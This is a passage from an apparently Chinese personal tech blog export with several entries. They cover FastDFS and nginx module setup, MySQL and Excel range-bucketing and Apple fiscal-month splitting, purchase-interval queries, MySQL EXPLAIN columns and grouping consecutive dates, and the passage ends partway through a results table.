<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/happyfish100/fastdfs-nginx-module.git</span><br><span class="line">cd fastdfs-nginx-module/</span><br><span class="line">./configure --add-module=/home/xuchunlei/Desktop/linkstart/fastdfs/fastdfs-nginx-module/src</span><br><span class="line">make</span><br><span class="line">make install</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>此时通过<code>/usr/local/nginx/sbin/nginx -V</code>来查看版本和模块信息。</p>
<ol start="3">
<li>配置nginx.conf<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vim /usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>配置文件中加入新的location，root配置到Storage的store_path0路径加上data</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location /group1/M00 &#123;</span><br><span class="line">    root /home/xuchunlei/Desktop/linkstart/upload/file/data;</span><br><span class="line">    ngx_fastdfs_module;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>创建/M00到data的软连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ln -s /home/xuchunlei/Desktop/linkstart/upload/file/data/ /home/xuchunlei/Desktop/linkstart/upload/file/data/group1/M00</span><br></pre></td></tr></table></figure>

<ol start="4">
<li>配置mod_fastdfs.conf<br>复制fastdfs-nginx-module源码中的配置文件到/etc/fdfs目录并修改。<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp mod_fastdfs.conf /etc/fdfs/</span><br></pre></td></tr></table></figure>

</li>
</ol>
<p>tracker_server<br><code>tracker_server=192.168.1.111:22122</code><br>false时，即访问地址不使用分组名称，nginx中不需要分组<br><code>url_have_group_name = true</code><br>必须和storage.conf中配置的store_path0路径的一致<br><code>store_path0=/home/xuchunlei/Desktop/linkstart/upload/file</code></p>
<p>复制FastDFS的部分配置文件（解压文件conf文件夹中）到/etc/fdfs目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cp http.conf /etc/fdfs/</span><br><span class="line">cp mime.types /etc/fdfs/</span><br></pre></td></tr></table></figure>

<p>重启Nginx</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">/usr/local/nginx/sbin/nginx -s stop</span><br><span class="line">/usr/local/nginx/sbin/nginx</span><br></pre></td></tr></table></figure>

<p>通过文件上传返回路径<code>http://192.168.1.111/group1/M00/00/00/wKgBb15BbKWAETJpAAGCZONuhNo096.png</code>来访问<br><img src="/img/20200211/3.jpg" alt></p>
]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>Redis</tag>
        <tag>FastDFS</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL借助Excel快速区间分段统计（客单价分布 IOS账单分月）</title>
    <url>/2022/08/27/MySQL%E5%80%9F%E5%8A%A9Excel%E5%BF%AB%E9%80%9F%E5%8C%BA%E9%97%B4%E5%88%86%E6%AE%B5%E7%BB%9F%E8%AE%A1%EF%BC%88%E5%AE%A2%E5%8D%95%E4%BB%B7%E5%88%86%E5%B8%83%20IOS%E8%B4%A6%E5%8D%95%E5%88%86%E6%9C%88%EF%BC%89/</url>
    <content><![CDATA[<p><em>本来这个是放在代码碎片系列里的（因为很少做开发了，从2020年初到现在才凑齐6个），当时因为按价格分段，奈何分段太多想出的“偷懒”方法，想单独写一篇文章，可惜篇幅不够。因为前一段时间受朋友之托，临危受命，帮忙做IOS的账单分月（当时并不清楚IOS的财年），刚开始以为没有规律可循，但是后来发现月份都是按照35，28，28天这样排列的，也就是都是7的倍数，觉得可以用之前的方法来实现。这里简单介绍下思路，具体操作根据数据来进行微调。</em></p>
<h3 id="客单价分布"><a href="#客单价分布" class="headerlink" title="客单价分布"></a>客单价分布</h3><p>最初想的写法和“偷懒”后的想法：<br><img src="/img/20220827/1.png" alt><br>因为这里区间是(0, 20]，(20, 40]……思路就是按照需要统计的字段减去最小的单位数字，然后除以分段区间的公约数后向下取整。如图中字段为金额，减去最小数值0.01元，然后除以20后向下取整。如果金额为0，结果就是-1；如果金额为0.01到20，结果就是0；如果金额是20.01到40，结果就是1。<br>下图是Excel的写法，但是和上面的sql不对应，这是后来的了：<br><img src="/img/20220827/2.png" alt><br>Excel的话，就是在MySQL的计算基础上加1，再乘以分段区间的公约数计算出所在区间。继续以上面的例子举例，结果-1的加1后乘以20，结果为0，不做统计；结果0的加1后乘以20，结果为20，区间(0, 20]；结果2的加1后乘以20，结果为40，区间(20, 40]。通过Excel公式SUMIF来判断所处区间，除了开头和结尾的两个能直接判断外，中间的需要减去之前的数值。有异常数据的时候需要自己判断了，比如金额为负数的订单。<br>这里做了一个简单的例子，可以参考一下：<br><img src="/img/20220827/3.png" alt><br>这里只是提供一个思路，调整区间只要公约数不变，只需要更改Excel区间条件就行了。</p>
<h3 id="IOS账单分月"><a href="#IOS账单分月" class="headerlink" title="IOS账单分月"></a>IOS账单分月</h3><p>财年（Fiscal Year，财经年度，财政年度，会计财务年度，会计年度），是指公司或国家每年制定预算或计算收入的统计时间。财季是指某一季度的财务状况，财年是指某一完整四个财季的财务状况。但每个国家或其法例所辖的组织各有不同，大抵分成历年制（历年度制,是指财政年度的起止期与年历始末相同，即公历1月1日起至12月31日止）和跨年制（跨日历年度制，是指财政年度起止期与年历始末不相同）两类。<br>AppStore2020账单日历：<br><img src="/img/20220827/4.png" alt><br>Apple财年由四个财季组成，每个季度分别为35天，28天，28天。苹果的财政年度从10月的财政年度开始，这意味着苹果的2020财年从2019年10月开始（包含9月），周天开始，周六结束，并为第一个季度。（深究的话，苹果财年只有364天，所以每5年必须在12账单月增加一周，这里不讨论）<br><img src="/img/20220827/5.png" alt><br>比如我这里限定区间范围，通过<code>YEARWEEK</code>来区分周（默认周天为每周第一天）。<br><img src="/img/20220827/6.png" alt><br>然后通过excel，分别以每5周，4周，4周进行公式填充。<br>这里只是提供一个思路，请以实际情况自行调整，单独通过MySQL不好实现的时候，可以借助下其他工具软件。</p>
]]></content>
      <tags>
        <tag>MySQL</tag>
        <tag>Excel</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL购买间隔时间计算</title>
    <url>/2020/08/27/MySQL%E8%B4%AD%E4%B9%B0%E9%97%B4%E9%9A%94%E6%97%B6%E9%97%B4%E8%AE%A1%E7%AE%97/</url>
    <content><![CDATA[<p><em>因为一些原因被要求按照客户消费金额分类披露客户购买间隔时间，并对其合理性进行补充分析。网上查出来的方法都是你抄我的我抄你的，于是乎自己开始思考如何去实现。</em></p>
<h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#MySQL80018</span><br><span class="line"></span><br><span class="line">CREATE TABLE `order_info`  (</span><br><span class="line">  `id` bigint(20) NOT NULL,</span><br><span class="line">  `name` varchar(255) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL COMMENT &apos;用户名&apos;,</span><br><span class="line">  `pay_time` datetime(0) NULL DEFAULT NULL COMMENT &apos;付款时间&apos;,</span><br><span class="line">  PRIMARY KEY (`id`) USING BTREE</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci COMMENT = &apos;订单信息&apos; ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">INSERT INTO `order_info` VALUES (1, &apos;张三&apos;, &apos;2020-01-01 12:50:01&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (2, &apos;李四&apos;, &apos;2020-01-02 12:46:38&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (3, &apos;李四&apos;, &apos;2020-01-04 08:23:06&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (4, &apos;王五&apos;, &apos;2020-02-06 09:47:42&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (5, &apos;王五&apos;, &apos;2020-02-07 18:42:23&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (6, &apos;王五&apos;, &apos;2020-03-12 20:22:45&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (7, &apos;赵六&apos;, &apos;2020-08-01 10:36:49&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (8, &apos;赵六&apos;, &apos;2020-08-04 12:37:09&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (9, &apos;赵六&apos;, &apos;2020-08-14 06:20:33&apos;);</span><br><span class="line">INSERT INTO `order_info` VALUES (10, &apos;赵六&apos;, &apos;2020-08-27 10:38:02&apos;);</span><br></pre></td></tr></table></figure>

<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><blockquote>
<p>可能不是最优思路，以下是我的实现方法。订单间隔时间只比较同一用户的订单。</p>
</blockquote>
<p>将原来的表需要的字段查出，添加行号字段，按照名字和时间升序排序，当作临时表用。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	@r := @r + 1 AS &apos;r&apos;,</span><br><span class="line">	`name`,</span><br><span class="line">	pay_time</span><br><span class="line">FROM</span><br><span class="line">	order_info,</span><br><span class="line">	( SELECT @r := 0 ) t</span><br><span class="line">ORDER BY</span><br><span class="line">	`name`,</span><br><span class="line">	pay_time</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">r</th>
<th align="center">name</th>
<th align="center">pay_time</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">张三</td>
<td align="center">2020-01-01 12:50:01</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">李四</td>
<td align="center">2020-01-02 12:46:38</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">李四</td>
<td align="center">2020-01-04 08:23:06</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">王五</td>
<td align="center">2020-02-06 09:47:42</td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">王五</td>
<td align="center">2020-02-07 18:42:23</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">王五</td>
<td align="center">2020-03-12 20:22:45</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">赵六</td>
<td align="center">2020-08-01 10:36:49</td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">赵六</td>
<td align="center">2020-08-04 12:37:09</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">赵六</td>
<td align="center">2020-08-14 06:20:33</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">赵六</td>
<td align="center">2020-08-27 10:38:02</td>
</tr>
</tbody></table>
<p>将上面的临时表左连接自己（@r要换名字，不然无法查出后面的数据），连接条件为名字相同，序号错位一格。只有用户有两单以上的时候，才会出现后面的数据。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	*</span><br><span class="line">FROM</span><br><span class="line">	(</span><br><span class="line">	SELECT</span><br><span class="line">		@r := @r + 1 AS &apos;r&apos;,</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	FROM</span><br><span class="line">		order_info,</span><br><span class="line">		( SELECT @r := 0 ) t</span><br><span class="line">	ORDER BY</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	) temp</span><br><span class="line">	LEFT JOIN (</span><br><span class="line">	SELECT</span><br><span class="line">		@rownum := @rownum + 1 AS &apos;r&apos;,</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	FROM</span><br><span class="line">		order_info,</span><br><span class="line">		( SELECT @rownum := 0 ) t</span><br><span class="line">	ORDER BY</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	) temp2 ON temp.r = temp2.r + 1</span><br><span class="line">	AND temp.`name` = temp2.`name`</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">r</th>
<th align="center">name</th>
<th align="center">pay_time</th>
<th align="center">r(1)</th>
<th align="center">name(1)</th>
<th align="center">pay_time(1)</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">张三</td>
<td align="center">2020-01-01 12:50:01</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">李四</td>
<td align="center">2020-01-02 12:46:38</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">李四</td>
<td align="center">2020-01-04 08:23:06</td>
<td align="center">2</td>
<td align="center">李四</td>
<td align="center">2020-01-02 12:46:38</td>
</tr>
<tr>
<td align="center">4</td>
<td align="center">王五</td>
<td align="center">2020-02-06 09:47:42</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">5</td>
<td align="center">王五</td>
<td align="center">2020-02-07 18:42:23</td>
<td align="center">4</td>
<td align="center">王五</td>
<td align="center">2020-02-06 09:47:42</td>
</tr>
<tr>
<td align="center">6</td>
<td align="center">王五</td>
<td align="center">2020-03-12 20:22:45</td>
<td align="center">5</td>
<td align="center">王五</td>
<td align="center">2020-02-07 18:42:23</td>
</tr>
<tr>
<td align="center">7</td>
<td align="center">赵六</td>
<td align="center">2020-08-01 10:36:49</td>
<td align="center"></td>
<td align="center"></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">8</td>
<td align="center">赵六</td>
<td align="center">2020-08-04 12:37:09</td>
<td align="center">7</td>
<td align="center">赵六</td>
<td align="center">2020-08-01 10:36:49</td>
</tr>
<tr>
<td align="center">9</td>
<td align="center">赵六</td>
<td align="center">2020-08-14 06:20:33</td>
<td align="center">8</td>
<td align="center">赵六</td>
<td align="center">2020-08-04 12:37:09</td>
</tr>
<tr>
<td align="center">10</td>
<td align="center">赵六</td>
<td align="center">2020-08-27 10:38:02</td>
<td align="center">9</td>
<td align="center">赵六</td>
<td align="center">2020-08-14 06:20:33</td>
</tr>
</tbody></table>
<p>过滤掉空数据，使用TIMESTAMPDIFF函数计算时间间隔</p>
<blockquote>
<p>TIMESTAMPDIFF(unit,begin,end);<br><code>unit</code>可以是<code>MICROSECOND</code>,<code>SECOND</code>,<code>MINUTE</code>,<code>HOUR</code>,<code>DAY</code>,<code>WEEK</code>,<code>MONTH</code>,<code>QUARTER</code>,<code>YEAR</code><br><code>begin</code>和<code>end</code>是DATE或DATETIME表达式</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">SELECT</span><br><span class="line">	temp.`name`,</span><br><span class="line">	temp.pay_time AS afterTime,</span><br><span class="line">	temp2.pay_time AS beforeTime,</span><br><span class="line">	TIMESTAMPDIFF( DAY, temp2.pay_time, temp.pay_time ) AS diff</span><br><span class="line">FROM</span><br><span class="line">	(</span><br><span class="line">	SELECT</span><br><span class="line">		@r := @r + 1 AS &apos;r&apos;,</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	FROM</span><br><span class="line">		order_info,</span><br><span class="line">		( SELECT @r := 0 ) t</span><br><span class="line">	ORDER BY</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	) temp</span><br><span class="line">	LEFT JOIN (</span><br><span class="line">	SELECT</span><br><span class="line">		@rownum := @rownum + 1 AS &apos;r&apos;,</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	FROM</span><br><span class="line">		order_info,</span><br><span class="line">		( SELECT @rownum := 0 ) t</span><br><span class="line">	ORDER BY</span><br><span class="line">		`name`,</span><br><span class="line">		pay_time</span><br><span class="line">	) temp2 ON temp.r = temp2.r + 1</span><br><span class="line">	AND temp.`name` = temp2.`name`</span><br><span class="line">WHERE</span><br><span class="line">	temp2.pay_time IS NOT NULL</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">name</th>
<th align="center">afterTime</th>
<th align="center">beforeTime</th>
<th align="center">diff</th>
</tr>
</thead>
<tbody><tr>
<td align="center">李四</td>
<td align="center">2020-01-04 08:23:06</td>
<td align="center">2020-01-02 12:46:38</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">王五</td>
<td align="center">2020-02-07 18:42:23</td>
<td align="center">2020-02-06 09:47:42</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">王五</td>
<td align="center">2020-03-12 20:22:45</td>
<td align="center">2020-02-07 18:42:23</td>
<td align="center">34</td>
</tr>
<tr>
<td align="center">赵六</td>
<td align="center">2020-08-04 12:37:09</td>
<td align="center">2020-08-01 10:36:49</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">赵六</td>
<td align="center">2020-08-14 06:20:33</td>
<td align="center">2020-08-04 12:37:09</td>
<td align="center">9</td>
</tr>
<tr>
<td align="center">赵六</td>
<td align="center">2020-08-27 10:38:02</td>
<td align="center">2020-08-14 06:20:33</td>
<td align="center">13</td>
</tr>
</tbody></table>
<h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>具体sql要根据自己的业务需求来写，实际使用效率在接受范围内吧，不是很快。<br>比如我最后写的sql就是一坨……<br><img src="/img/20200827/1.png" alt></p>
]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL EXPLAIN 简单了解</title>
    <url>/2021/08/13/MySQL%20EXPLAIN%20%E7%AE%80%E5%8D%95%E4%BA%86%E8%A7%A3/</url>
    <content><![CDATA[<p><em>帮朋友解决了一个查询问题(查询报错The table ‘C:\Windows\TEMP#sqlxxxxxx’ is full)。试过增加tmp_table_size和max_heap_table_size的大小，然并卵；用SQL_BIG_RESULT强制跑，结果把C盘100多G的空间干满了，No space left on device；最后用了EXPLAIN分析SQL语句的执行计划信息，来去除临时表，然后问题解决。了解到了以前不了解的知识，比如最左(前缀)匹配原则。为了以后不在踩坑，这里简单写一以下EXPLAIN的信息以备后用。</em></p>
<h3 id="EXPLAIN简介"><a href="#EXPLAIN简介" class="headerlink" title="EXPLAIN简介"></a>EXPLAIN简介</h3><p><code>EXPLAIN</code>可以获取SQL语句的执行计划信息，可用于<code>SELECT</code>，<code>DELETE</code>，<code>INSERT</code>，<code>REPLACE</code>，和<code>UPDATE</code>语句，用来分析优化SQL以及表结构。执行（<code>EXPLAIN</code> + SQL语句）效果如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mysql&gt; explain select 1 from dual;</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">| id | select_type | table | partitions | type | possible_keys | key  | key_len | ref  | rows | filtered | Extra          |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">|  1 | SIMPLE      | NULL  | NULL       | NULL | NULL          | NULL | NULL    | NULL | NULL |     NULL | No tables used |</span><br><span class="line">+----+-------------+-------+------------+------+---------------+------+---------+------+------+----------+----------------+</span><br><span class="line">1 row in set, 1 warning (0.00 sec)</span><br></pre></td></tr></table></figure>

<h3 id="EXPLAIN列信息"><a href="#EXPLAIN列信息" class="headerlink" title="EXPLAIN列信息"></a>EXPLAIN列信息</h3><ul>
<li><p>id<br>SELECT的标识符，按照SELECT出现顺序增长，UNION查询id为NULL。</p>
</li>
<li><p>select_type<br>SELECT的类型</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">值</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">SIMPLE</td>
<td align="left">简单查询（不使用UNION和子查询）</td>
</tr>
<tr>
<td align="center">PRIMARY</td>
<td align="left">复杂查询最外层的SELECT</td>
</tr>
<tr>
<td align="center">UNION</td>
<td align="left">UNION中第二个或以后的SELECT</td>
</tr>
<tr>
<td align="center">DEPENDENT UNION</td>
<td align="left">UNION中第二个或以后的SELECT（依赖于外部查询）</td>
</tr>
<tr>
<td align="center">UNION RESULT</td>
<td align="left">UNION的结果</td>
</tr>
<tr>
<td align="center">SUBQUERY</td>
<td align="left">子查询第一个SELECT</td>
</tr>
<tr>
<td align="center">DEPENDENT SUBQUERY</td>
<td align="left">子查询第一个SELECT（依赖于外部查询）</td>
</tr>
<tr>
<td align="center">DERIVED</td>
<td align="left">派生表</td>
</tr>
<tr>
<td align="center">MATERIALIZED</td>
<td align="left">物化子查询</td>
</tr>
<tr>
<td align="center">UNCACHEABLE SUBQUERY</td>
<td align="left">子查询无法被物化，每次都需要重新评估</td>
</tr>
<tr>
<td align="center">UNCACHEABLE UNION</td>
<td align="left">UNION中第二个或以后的无法被物化的SELECT（类似UNCACHEABLE SUBQUERY）</td>
</tr>
</tbody></table>
<ul>
<li>table<br>输出行所引用表名，或者以下值：</li>
</ul>
<table>
<thead>
<tr>
<th align="center">值</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">&lt;unionM,N&gt;</td>
<td align="left">id为M和N行的并集</td>
</tr>
<tr>
<td align="center">&lt;derivedN&gt;</td>
<td align="left">id为N行的派生表结果</td>
</tr>
<tr>
<td align="center">&lt;subqueryN&gt;</td>
<td align="left">id为N行的物化子查询结果</td>
</tr>
</tbody></table>
<ul>
<li><p>partitions<br>匹配记录所在的分区（非分区表该值为NULL）</p>
</li>
<li><p>type<br>连接类型，效率从高到低排列为：</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">值</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">system</td>
<td align="left">表只有一行（类似系统表，const连接类型的一个特例）</td>
</tr>
<tr>
<td align="center">const</td>
<td align="left">该表最多有一个匹配行，该列的值可以被优化器的其余部分视为常量</td>
</tr>
<tr>
<td align="center">eq_ref</td>
<td align="left">从该表中读取一行与前一张表的所有行组合（使用主键索引或唯一非空索引）</td>
</tr>
<tr>
<td align="center">ref</td>
<td align="left">从该表中读取具有匹配索引值的所有行与前一张表的所有行的组合（不使用唯一索引，使用普通索引或唯一性索引的部分前缀）</td>
</tr>
<tr>
<td align="center">fulltext</td>
<td align="left">使用全文索引</td>
</tr>
<tr>
<td align="center">ref_or_null</td>
<td align="left">类似ref，但是需要额外搜索NULL</td>
</tr>
<tr>
<td align="center">index_merge</td>
<td align="left">使用索引合并的优化方法</td>
</tr>
<tr>
<td align="center">unique_subquery</td>
<td align="left">替代了 value IN (SELECT primary_key FROM single_table WHERE some_expr) 形式的eq_ref一些IN子查询</td>
</tr>
<tr>
<td align="center">index_subquery</td>
<td align="left">类似unique_subquery，替代了IN子查询，适用于 value IN (SELECT key_column FROM single_table WHERE some_expr) 形式的子查询中的非唯一索引</td>
</tr>
<tr>
<td align="center">range</td>
<td align="left">使用索引来检索给定范围的行</td>
</tr>
<tr>
<td align="center">index</td>
<td align="left">与ALL一样，但是扫描索引树（全索引扫描）</td>
</tr>
<tr>
<td align="center">ALL</td>
<td align="left">全表扫描</td>
</tr>
</tbody></table>
<ul>
<li><p>possible_keys<br>该表中可以使用哪个索引去查找行</p>
</li>
<li><p>key<br>该表中实际使用索引去查找行</p>
</li>
<li><p>key_len<br>该表中实际使用索引长度（可以推断使用组合索引中的多少）</p>
</li>
<li><p>ref<br>key列记录的索引中，表查找值所用到的列，常量（const）或函数（func）</p>
</li>
<li><p>rows<br>读取并检测的行数</p>
</li>
<li><p>filtered<br>按表条件过滤的行的估计百分比，最大值为100（没有发生行过滤）</p>
</li>
<li><p>Extra<br>附加信息，比较常见重要的如下</p>
</li>
</ul>
<table>
<thead>
<tr>
<th align="center">值</th>
<th align="left">意义</th>
</tr>
</thead>
<tbody><tr>
<td align="center">Using index</td>
<td align="left">使用索引树中的信息从表中检索列信息</td>
</tr>
<tr>
<td align="center">Using where</td>
<td align="left">使用WHERE限制返回的行</td>
</tr>
<tr>
<td align="center">Using temporary</td>
<td align="left">需要创建一个临时表来保存结果（比如GROUP BY和ORDER BY会出现，需要优化，一般用添加索引来优化）</td>
</tr>
<tr>
<td align="center">Using filesort</td>
<td align="left">对结果使用一个外部索引排序，而不是按索引次序从表里读取行（需要优化，一般用索引来优化）</td>
</tr>
</tbody></table>
]]></content>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL连续日期分组统计(by连续登录天数)</title>
    <url>/2022/03/07/MySQL%E8%BF%9E%E7%BB%AD%E6%97%A5%E6%9C%9F%E5%88%86%E7%BB%84%E7%BB%9F%E8%AE%A1-by%E8%BF%9E%E7%BB%AD%E7%99%BB%E5%BD%95%E5%A4%A9%E6%95%B0/</url>
    <content><![CDATA[<p><em>今天又被朋友问到（要）去年11月底一个夜晚帮他写的sql-一个广告投放的数据，想根据连续的投放日期来分组。开始完全不知道如何去分组，不过当晚灵机一动-用连续登录天数的思路貌似可以解决。然后马上实现就丢了回去（分组条件有点多，还搞了下去重，结果都是独立的，没有重复……白干了好多）。今天问到我的时候已经忘的差不多了，整理下思路备用</em></p>
<h3 id="数据准备"><a href="#数据准备" class="headerlink" title="数据准备"></a>数据准备</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#MySQL80018</span><br><span class="line"></span><br><span class="line">CREATE TABLE `ad_serving`  (</span><br><span class="line">  `order_id` varchar(20) CHARACTER SET utf8 COLLATE utf8_general_ci NULL DEFAULT NULL,</span><br><span class="line">  `serving_date` date NULL DEFAULT NULL COMMENT &apos;投放日期&apos;</span><br><span class="line">) ENGINE = InnoDB CHARACTER SET = utf8 COLLATE = utf8_general_ci ROW_FORMAT = Dynamic;</span><br><span class="line"></span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;1&apos;, &apos;2022-03-01&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;1&apos;, &apos;2022-03-02&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;1&apos;, &apos;2022-03-03&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;1&apos;, &apos;2022-03-05&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;1&apos;, &apos;2022-03-06&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-01&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-02&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-04&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-05&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-06&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;2&apos;, &apos;2022-03-07&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;3&apos;, &apos;2022-03-01&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;3&apos;, &apos;2022-03-03&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;3&apos;, &apos;2022-03-05&apos;);</span><br><span class="line">INSERT INTO `ad_serving` VALUES (&apos;3&apos;, &apos;2022-03-06&apos;);</span><br></pre></td></tr></table></figure>

<h3 id="实现思路"><a href="#实现思路" class="headerlink" title="实现思路"></a>实现思路</h3><blockquote>
<p>可能不是最优思路，以下是我的实现方法。</p>
</blockquote>
<p>先将数据按照条件，日期进行排序，这里是根据订单ID分区，然后投放日期升序排列。根据顺序新增一个行号列，用于后面起始日期计算。<br><del><code>这里之前我用的row_number()，前提是没有重复的日期。有重复日期的话请用dense_rank()，这样下一步计算起始日期才对</code></del></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#分组添加行号</span><br><span class="line">create table temp_ad_serving as select ad_serving.*, dense_rank() over(partition by order_id order by serving_date) AS r from ad_serving order by order_id, serving_date</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">order_id</th>
<th align="center">serving_date</th>
<th align="center">r</th>
</tr>
</thead>
<tbody><tr>
<td align="center">1</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-02</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-03</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-05</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">1</td>
<td align="center">2022-03-06</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-02</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-04</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-05</td>
<td align="center">4</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-06</td>
<td align="center">5</td>
</tr>
<tr>
<td align="center">2</td>
<td align="center">2022-03-07</td>
<td align="center">6</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-01</td>
<td align="center">1</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-03</td>
<td align="center">2</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-05</td>
<td align="center">3</td>
</tr>
<tr>
<td align="center">3</td>
<td align="center">2022-03-06</td>
<td align="center">4</td>
</tr>
</tbody></table>
<p>然后计算分组辅助日期，用日期减去上面的行号=天数(这里天数去掉一天了, 不减去也可以，只是用于分组的条件)。新增一列分组辅助日期。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#添加分组辅助日期</span><br><span class="line">create table temp_ad_serving_group as select temp_ad_serving.*, date_sub(serving_date, interval r - 1 day) 分组辅助日期 from temp_ad_serving</span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th align="center">order_id</th>
<th align="center">serving_date</th>
<th align="center">r</th>
<th align="center">分组辅助日期</th>
</tr>
</thead>
